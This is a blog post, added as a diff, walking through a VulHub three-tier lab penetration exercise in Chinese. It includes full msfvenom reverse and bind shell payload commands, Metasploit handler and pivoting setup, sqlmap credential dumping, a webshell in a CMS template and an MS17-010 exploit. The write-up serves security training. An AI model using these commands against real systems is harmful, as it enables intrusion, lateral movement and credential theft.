@@ -1,0 +1,611 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Yu ting">
+  <meta name="keywords" content="">
+  <title>【VulHub靶场】之CFS三层靶机内网渗透 - Fearless&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"fearless0923.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Fearless's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="【VulHub靶场】之CFS三层靶机内网渗透">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2023-09-19 08:19" pubdate>
+        September 19, 2023 am
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      19
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">【VulHub靶场】之CFS三层靶机内网渗透</h1>
+            
+            <div class="markdown-body">
+              <h1>【VulHub靶场】之CFS三层靶机内网渗透</h1>
+<h3 id="一、环境搭建"><a class="header-anchor" href="#一、环境搭建">🍭</a>一、环境搭建</h3>
+<p>靶场环境：</p>
+<p><img src="/2023/09/19/cfs/2.png" srcset="/img/loading.gif" alt="2"></p>
+<p>将靶场下载到本地，先进入VM配置网卡，搭建好一个内网环境，再将三台虚拟机导入vm。</p>
+<p>这里我们配置3张网卡，如下：</p>
+<p><img src="/2023/09/19/cfs/1.png" srcset="/img/loading.gif" alt="1"></p>
+<p>然后把对应的网卡添加到虚拟机上：</p>
+<img src="/2023/09/19/cfs/3.png" srcset="/img/loading.gif" alt="3">
+<img src="/2023/09/19/cfs/4.png" srcset="/img/loading.gif" alt="4">
+<img src="/2023/09/19/cfs/5.png" srcset="/img/loading.gif" alt="5">
+<p>配置宝塔环境：</p>
+<p>target1：宝塔地址：<a target="_blank" rel="noopener" href="http://192.168.20.135:8888/">http://192.168.20.135:8888/</a> 账号：eaj3yhsl密码：41bb8fee<img src="/2023/09/19/cfs/6.png" srcset="/img/loading.gif" alt="6" style="zoom: 50%;"></p>
+<p>将centos靶机中c段为20的那个ip添加进去，打开目标的80端口，确保能够访问到对应的web页面：</p>
+<p><img src="/2023/09/19/cfs/7.png" srcset="/img/loading.gif" alt="7"></p>
+<p>ubuntu同理进行配置，至此环境搭建完成，目前信息如下：</p>
+<img src="/2023/09/19/cfs/8.png" srcset="/img/loading.gif" alt="8" style="zoom:67%;">
+<h3 id="二、渗透实操"><a class="header-anchor" href="#二、渗透实操">🍭</a>二、渗透实操</h3>
+<p>思路：kali和centos的第一张网卡位于外网，即攻击者拥有一台kali，ubuntu、win7无法连接外网，所以只能先打下centos，然后作为跳板攻击ubuntu，win7，即现在要对一个ip为192.168.20.135的外网主机进行渗透。</p>
+<h4 id="target1：centos"><a class="header-anchor" href="#target1：centos">🍭</a>target1：centos</h4>
+<p>先进行信息收集：nmap扫描探测端口开启了什么服务</p>
+<img src="/2023/09/19/cfs/9.png" srcset="/img/loading.gif" alt="9" style="zoom:67%;">
+<p>80端口开放，访问80端口：</p>
+<img src="/2023/09/19/cfs/10.png" srcset="/img/loading.gif" alt="10" style="zoom:50%;">
+<p>打开后发现它是 ThinkPHP 框架V5.0，它存在一个 RCE，直接用工具检测</p>
+<p><img src="/2023/09/19/cfs/11.png" srcset="/img/loading.gif" alt="11"></p>
+<p>测试一下</p>
+<p><img src="/2023/09/19/cfs/12.png" srcset="/img/loading.gif" alt="12"></p>
+<p>蚁剑getshell</p>
+<p><img src="/2023/09/19/cfs/13.png" srcset="/img/loading.gif" alt="13"></p>
+<p>利用蚁剑的终端做进一步信息收集，发现了另一个ip</p>
+<img src="/2023/09/19/cfs/14.png" srcset="/img/loading.gif" alt="14" style="zoom:67%;">
+<p>这就说明了它还存在其他内网主机，接下来需要利用msf创建一个后门。</p>
+<p>在桌面创建一个elf格式的木马，</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p linux/x<span class="hljs-number">86</span>/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.x LPORT=<span class="hljs-number">4444</span> -f elf &gt; <span class="hljs-number">4444</span>.elf</code></pre>
+<p><img src="/2023/09/19/cfs/15.png" srcset="/img/loading.gif" alt="15"></p>
+<p>通过刚才蚁剑上传上去，</p>
+<p><img src="/2023/09/19/cfs/16.png" srcset="/img/loading.gif" alt="16"></p>
+<p>最后给 4444.elf 一个可执行权限并运行成功上线：</p>
+<pre><code class="hljs angelscript">chmod +x <span class="hljs-number">4444.</span>elf
+./<span class="hljs-number">4444.</span>elf</code></pre>
+<p>执行</p>
+<p><img src="/2023/09/19/cfs/17.png" srcset="/img/loading.gif" alt="17"></p>
+<p>kali开监控，执行木马</p>
+<pre><code class="hljs routeros">msfconsole
+use exploit/multi/handler
+<span class="hljs-builtin-name">set</span> payload linux/x64/meterpreter/reverse_tcp
+<span class="hljs-builtin-name">set</span> LHOST 192.168.20.131
+<span class="hljs-builtin-name">set</span> LPORT 4444
+exploit</code></pre>
+<p>执行</p>
+<img src="/2023/09/19/cfs/18.png" srcset="/img/loading.gif" alt="18" style="zoom:67%;">
+<p>但这里一直不成功，上网查阅资料发现，我前面生成木马的语句是适用msf5的，但我的版本是msf6</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p linux/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.x LPORT=<span class="hljs-number">4444</span> -f elf &gt; <span class="hljs-number">4444</span>.elf  //msf<span class="hljs-number">5</span>写法
+<span class="hljs-attribute">msfvenom</span> -p linux/x<span class="hljs-number">64</span>/meterpreter_reverse_tcp LHOST=<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.x LPORT=<span class="hljs-number">4444</span> -f elf &gt; <span class="hljs-number">4444</span>.elf  //msf<span class="hljs-number">6</span>写法</code></pre>
+<p>重新生成木马后成功getshell</p>
+<p><img src="/2023/09/19/cfs/19.png" srcset="/img/loading.gif" alt="19"></p>
+<p>这里彻底地拿到了centos的权限，接下来进行探测打内网其他的主机</p>
+<h4 id="target2：ubuntu"><a class="header-anchor" href="#target2：ubuntu">🍭</a>target2：ubuntu</h4>
+<p>先进行信息收集，但发现nmap扫不到，因为我们的网段设置，这里扫描是用的kali的ip扫描，<strong>模拟的环境中kali和centos是公网主机，所以可以直接扫到，而现在扫的ubuntu属于内网网段</strong>是扫不到的。此时可以利用刚才打下的centos，centos虽然是公网主机，但是它也在内网里，所以我们就用centos的ip来打它的内网。</p>
+<p>先用msf自带的探测网络接口的模块进一步进行信息探测</p>
+<pre><code class="hljs dockerfile"><span class="hljs-keyword">run</span><span class="bash"> get_local_subnets</span></code></pre>
+<p><img src="/2023/09/19/cfs/20.png" srcset="/img/loading.gif" alt="20"></p>
+<p>centos处于2个网段内，我们需要来添加一个路由**(autoroute -s)**，因为kali已经在20的网段内，所以添加的路由肯定添加22网段的，相当于我们建立了一个攻击机kali和22网段的隧道：</p>
+<pre><code class="hljs angelscript">run <span class="hljs-built_in">auto</span>route -s <span class="hljs-number">192.168</span><span class="hljs-number">.22</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>
+run <span class="hljs-built_in">auto</span>route -p</code></pre>
+<p><img src="/2023/09/19/cfs/21.png" srcset="/img/loading.gif" alt="21"></p>
+<p>现在实现了centos上的shell到22网段，现在要想用kali到达22网段，就要上代理,使用msf模块存在代理功能</p>
+<pre><code class="hljs angelscript">background 
+use auxiliary/server/socks_proxy
+<span class="hljs-keyword">set</span> SRVHOST <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
+<span class="hljs-keyword">set</span> SRVPORT <span class="hljs-number">1080</span>
+exploit</code></pre>
+<p>执行</p>
+<p><img src="/2023/09/19/cfs/22.png" srcset="/img/loading.gif" alt="22"></p>
+<p>设置本地代理接口访问：</p>
+<pre><code class="hljs angelscript">vim /etc/proxychains4.conf
+socks5 <span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.131</span> <span class="hljs-number">1080</span></code></pre>
+<p>进行添加</p>
+<p><img src="/2023/09/19/cfs/23.png" srcset="/img/loading.gif" alt="23"></p>
+<p>此时在指令前输入proxychains4即可走代理来执行命令，探测一下Ubuntu端口</p>
+<pre><code class="hljs angelscript">proxychains4 nmap -sT -Pn <span class="hljs-number">192.168</span><span class="hljs-number">.22</span><span class="hljs-number">.129</span></code></pre>
+<p><img src="/2023/09/19/cfs/24.png" srcset="/img/loading.gif" alt="24"></p>
+<p>80端口开放，进行访问，浏览器访问需要将浏览器代理设置为192.168.20.131:1080</p>
+<img src="/2023/09/19/cfs/25.png" srcset="/img/loading.gif" alt="25" style="zoom:50%;">
+<p>进行访问：</p>
+<p><img src="/2023/09/19/cfs/26.png" srcset="/img/loading.gif" alt="26"></p>
+<p>查看源码</p>
+<p><img src="/2023/09/19/cfs/27.png" srcset="/img/loading.gif" alt="27"></p>
+<p>提示了SQL注入点，sqlmap跑一下</p>
+<pre><code class="hljs awk">proxychains4 sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span>  --dbs   <span class="hljs-regexp">//</span>爆库
+
+proxychains4 sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span>  -D bagecms --tables <span class="hljs-regexp">//</span>爆表
+
+proxychains4 sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> -p keyword -D begacms -T bage_admin --columns  <span class="hljs-regexp">//</span>爆列
+
+proxychains4 sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> -p keyword -D bagecms -T bage_admin -C username,password –dump  <span class="hljs-regexp">//</span>爆值</code></pre>
+<p>爆库：</p>
+<p><img src="/2023/09/19/cfs/28.png" srcset="/img/loading.gif" alt="28"></p>
+<p>爆表：<img src="/2023/09/19/cfs/29.png" srcset="/img/loading.gif" alt="29"></p>
+<p>爆值：<img src="/2023/09/19/cfs/30.png" srcset="/img/loading.gif" alt="30"></p>
+<p>爆出了账号密码，进行登录。用kali的目录扫描寻找登录页面</p>
+<p><img src="/2023/09/19/cfs/50.png" srcset="/img/loading.gif" alt="50"></p>
+<p>找到了robots.txt</p>
+<p><img src="/2023/09/19/cfs/51.png" srcset="/img/loading.gif" alt="51"></p>
+<p>访问得到登录页面：</p>
+<p><img src="/2023/09/19/cfs/45.png" srcset="/img/loading.gif" alt="45"></p>
+<p>进行登录</p>
+<p><img src="/2023/09/19/cfs/32.png" srcset="/img/loading.gif" alt="32"></p>
+<p>成功登录</p>
+<p><img src="/2023/09/19/cfs/33.png" srcset="/img/loading.gif" alt="33"></p>
+<p>浏览了网页发现，在模板处可以写入文件，我们在此写入一句话木马</p>
+<p><img src="/2023/09/19/cfs/34.png" srcset="/img/loading.gif" alt="34"></p>
+<p>蚁剑连接时要配上和kali一样的代理，</p>
+<p><img src="/2023/09/19/cfs/35.png" srcset="/img/loading.gif" alt="35"></p>
+<p>连接</p>
+<img src="/2023/09/19/cfs/49.png" srcset="/img/loading.gif" alt="49" style="zoom:50%;">
+<p><img src="/2023/09/19/cfs/36.png" srcset="/img/loading.gif" alt="36"></p>
+<p>拿到webshell权限，同理，要进一步拿到主机权限。我们一样生成针对ubuntu的木马，但是<strong>木马的shell只能用正向</strong>，因为我们是搭建隧道来访问的ubuntu，正常访问是访问不到的，且它处于内网中也访问不到我们，所以我们需要通过隧道去找他。</p>
+<p>生成木马：</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p linux/x<span class="hljs-number">64</span>/meterpreter/bind_tcp LPORT=<span class="hljs-number">3333</span> -f elf &gt; <span class="hljs-number">2</span>.elf</code></pre>
+<p><img src="/2023/09/19/cfs/37.png" srcset="/img/loading.gif" alt="37"></p>
+<p>上传，开启监听</p>
+<pre><code class="hljs routeros">use exploit/multi/handler
+<span class="hljs-builtin-name">set</span> payload linux/x64/meterpreter/bind_tcp
+<span class="hljs-builtin-name">set</span> rhost 192.168.22.129
+<span class="hljs-builtin-name">set</span> LPORT 3333
+run</code></pre>
+<p><img src="/2023/09/19/cfs/38.png" srcset="/img/loading.gif" alt="38"></p>
+<p>成功拿下</p>
+<h4 id="target3：win7"><a class="header-anchor" href="#target3：win7">🍭</a>target3：win7</h4>
+<p>接下来跟之前差不多，获取网络接口，添加路由</p>
+<pre><code class="hljs angelscript">run get_local_subnets
+run <span class="hljs-built_in">auto</span>route -s <span class="hljs-number">192.168</span><span class="hljs-number">.33</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span></code></pre>
+<p><img src="/2023/09/19/cfs/39.png" srcset="/img/loading.gif" alt="39"></p>
+<p><img src="/2023/09/19/cfs/40.png" srcset="/img/loading.gif" alt="40"></p>
+<p>对33网段进行扫描</p>
+<pre><code class="hljs angelscript">proxychains4 nmap -sT -Pn <span class="hljs-number">192.168</span><span class="hljs-number">.33</span><span class="hljs-number">.33</span></code></pre>
+<p><img src="/2023/09/19/cfs/41.png" srcset="/img/loading.gif" alt="41"></p>
+<p><img src="/2023/09/19/cfs/42.png" srcset="/img/loading.gif" alt="42"></p>
+<p>发现445端口，直接用永恒之蓝</p>
+<pre><code class="hljs angelscript">search ms17<span class="hljs-number">-010</span>
+use <span class="hljs-number">1</span>
+<span class="hljs-keyword">set</span> payload windows/x64/meterpreter/bind_tcp
+<span class="hljs-keyword">set</span> RHOSTS <span class="hljs-number">192.168</span><span class="hljs-number">.33</span><span class="hljs-number">.33</span>
+<span class="hljs-keyword">set</span> LPORT <span class="hljs-number">4444</span>
+run</code></pre>
+<p>执行</p>
+<p><img src="/2023/09/19/cfs/46.png" srcset="/img/loading.gif" alt="46"></p>
+<p><img src="/2023/09/19/cfs/47.png" srcset="/img/loading.gif" alt="47"></p>
+<p>进入命令行</p>
+<p><img src="/2023/09/19/cfs/48.png" srcset="/img/loading.gif" alt="48"></p>
+<p>成功拿下！</p>
+<h3 id="三、总结"><a class="header-anchor" href="#三、总结">🍭</a>三、总结</h3>
+<p>此次渗透涉及知识点：</p>
+<ul>
+<li>Thinkphp5.x Rce漏洞利用</li>
+<li>MSF添加路由和socks代理</li>
+<li>八哥CMS的漏洞利用Getshell，</li>
+<li>sql注入–&gt;后台管理登陆，</li>
+<li>大马、小马</li>
+<li>Ms17-010的psexec利用模块的使用</li>
+</ul>
+<p>思路：将centos主机作为跳板从而横向移动通过利用MSF的路由功能，不断添加路由+socks代理，横向移动到内网。</p>
+<p>注意点：</p>
+<ul>
+<li>sqlmap、dirb进行扫描时很容易导致服务器time out，此时要尝试一下手工注入</li>
+<li>在使用msf的时候注意session的存活状态，session过期就重试一遍</li>
+<li>kali上的proxychains4不太稳定</li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/23/un/">
+                        <span class="hidden-mobile">buu（十二）</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
